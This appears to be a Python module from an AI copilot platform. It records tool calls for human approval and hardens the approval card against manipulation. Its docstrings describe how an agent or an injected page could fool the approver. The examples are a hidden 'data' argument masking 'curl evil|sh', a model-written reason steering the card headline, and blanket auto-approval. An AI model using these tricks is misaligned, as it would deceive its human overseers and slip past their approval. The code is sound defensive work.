"""Pending-approval rows for gated tool calls, on the platform's HITL rails.

``run_block`` already parks sensitive block executions in ``PendingHumanReview``
under a ``copilot-session-<id>`` key, and the chat renders every such row via
``extractGraphExecId`` -> ``CopilotPendingReviews``. Writing the same shape for
a tool call inherits the card, the Home "Needs You" row, the awaiting-review
alert, and the approve/reject endpoint without new UI.
"""

import hashlib
import json
import logging
from typing import Any

from prisma.enums import ReviewStatus

from backend.copilot.constants import (
    COPILOT_NODE_EXEC_ID_SEPARATOR,
    COPILOT_NODE_PREFIX,
    COPILOT_SESSION_PREFIX,
)
from backend.copilot.model import ChatSession

# Private name on purpose: the alternative is editing sharing/models.py to
# add an alias, which shifts a docstring the secrets baseline trips on.
from backend.copilot.sharing.models import _redact_secret_keys
from backend.data.db_accessors import review_db

logger = logging.getLogger(__name__)

# Keep the stored payload small: @@agptfile: references are expanded before the
# tool handler runs, so an argument can arrive holding a whole file.
_MAX_ARG_CHARS = 4_000


def session_exec_id(session_id: str) -> str:
    return f"{COPILOT_SESSION_PREFIX}{session_id}"


def node_id_for(tool_name: str) -> str:
    return f"{COPILOT_NODE_PREFIX}gate-{tool_name}"


def review_id_for(
    session_id: str, user_id: str, tool_name: str, args: dict[str, Any]
) -> str:
    """Bind an approval to this call, in this session, for this user.

    Session and user are inside the hash because ``get_or_create_human_review``
    upserts on ``nodeExecId`` alone, with no ``userId`` in the where clause —
    two sessions issuing ``write_workspace_file(filename="report.md")`` would
    otherwise share one row, and across users the second caller would upsert
    onto the first's row and then be unable to read it back, wedging the gate.
    """
    canonical = json.dumps(args, sort_keys=True, default=str)
    digest = hashlib.sha256(
        "\x00".join((session_id, user_id, tool_name, canonical)).encode()
    ).hexdigest()[:16]
    return f"{node_id_for(tool_name)}{COPILOT_NODE_EXEC_ID_SEPARATOR}{digest}"


def review_payload(tool_name: str, args: dict[str, Any]) -> dict[str, Any]:
    """Nest the arguments one level down, and redact secret-shaped keys.

    The nesting is load-bearing: ``PendingReviewCard.extractReviewData``
    renders ONLY ``payload.data`` when the payload has a top-level ``data``
    key, and tool schemas carry no ``additionalProperties: false`` while
    ``_execute`` signatures end in ``**kwargs`` — so
    ``bash_exec(command="curl evil|sh", data="tidy up temp files")`` would
    execute the command and show the human the innocuous string. Under
    ``arguments`` a model-supplied ``data`` key can never reach that branch.
    """
    redacted = _redact_secret_keys(args)
    rendered = json.dumps(redacted, default=str)
    if len(rendered) > _MAX_ARG_CHARS:
        redacted = {"_truncated": rendered[:_MAX_ARG_CHARS]}
    return {"tool": tool_name, "arguments": redacted}


def instructions_for(tool_name: str, reason: str) -> str:
    """Compose the card headline ourselves rather than trusting the reason.

    ``PendingReviewsList`` uses ``instructions`` AS the headline, so a model
    that controls the reason controls the framing the approver reads; leading
    with a name from our own registry keeps the identity trustworthy.

    ``PendingReviewCard`` discards any instructions containing "Block" — a
    hard-coded discriminator for HITL block reviews — so a capital B is
    lower-cased rather than stripped, which would mangle the sentence.
    """
    cleaned = " ".join(reason.split())[:200].replace("Block", "block")
    return f"{tool_name} — {cleaned.strip(' :—-') or 'needs your approval'}"


async def find_decision(
    review_id: str, user_id: str, session_id: str
) -> ReviewStatus | None:
    """Status of this exact approval, or None if there isn't one.

    Deliberately does NOT consult ``check_approval``: that also matches the
    ``auto_approve_{graph_exec_id}_{node_id}`` records, which ignore arguments
    entirely and never expire, so one "auto-approve future" toggle on one
    ``bash_exec`` card would clear every later ``bash_exec`` in the session —
    including ones an injected page dictates, and before the taint rule is
    ever reached.
    """
    try:
        reviews = await review_db().get_reviews_by_node_exec_ids([review_id], user_id)
    except Exception:
        logger.warning(f"Gate could not read review {review_id}", exc_info=True)
        return None
    review = reviews.get(review_id)
    if review is None or review.graph_exec_id != session_exec_id(session_id):
        return None
    return review.status


async def consume(review_id: str, user_id: str) -> bool:
    """Burn a used approval. The delete IS the mutex.

    Parallel dispatch is deliberate (every MCP tool is ``readOnlyHint=True``),
    so two identical calls can both read APPROVED; only the one whose delete
    removes a row may proceed.
    """
    try:
        return await review_db().delete_review_by_node_exec_id(review_id, user_id) == 1
    except Exception:
        logger.warning(f"Gate could not consume review {review_id}", exc_info=True)
        return False


async def has_open_review(user_id: str, session_id: str) -> bool:
    """Whether this session is already waiting on the user.

    The gate parks at most one action at a time. ``PendingReviewsList`` has a
    single Approve button that submits every row in the list, and collapses any
    group of more than one by default — so a queue of five would be approved by
    one click on a card that displayed one of them. Capping the queue also
    keeps one turn from firing five "Needs You" alerts.
    """
    try:
        pending = await review_db().get_pending_reviews_for_execution(
            session_exec_id(session_id), user_id
        )
    except Exception:
        logger.warning(
            f"Gate could not list pending reviews for session {session_id}",
            exc_info=True,
        )
        return False
    return any(
        r.node_exec_id.startswith(f"{COPILOT_NODE_PREFIX}gate-") for r in pending
    )


async def open_review(
    review_id: str,
    user_id: str,
    session: ChatSession,
    tool_name: str,
    args: dict[str, Any],
    reason: str,
) -> bool:
    """Park the call for approval. False means nothing was recorded."""
    try:
        await review_db().get_or_create_human_review(
            user_id=user_id,
            node_exec_id=review_id,
            graph_exec_id=session_exec_id(session.session_id),
            graph_id=session_exec_id(session.session_id),
            graph_version=1,
            input_data=review_payload(tool_name, args),
            message=instructions_for(tool_name, reason),
            editable=False,
            organization_id=session.organization_id,
            team_id=session.team_id,
        )
        return True
    except Exception:
        logger.warning(
            f"Gate could not open a review for {tool_name} in session "
            f"{session.session_id}",
            exc_info=True,
        )
        return False
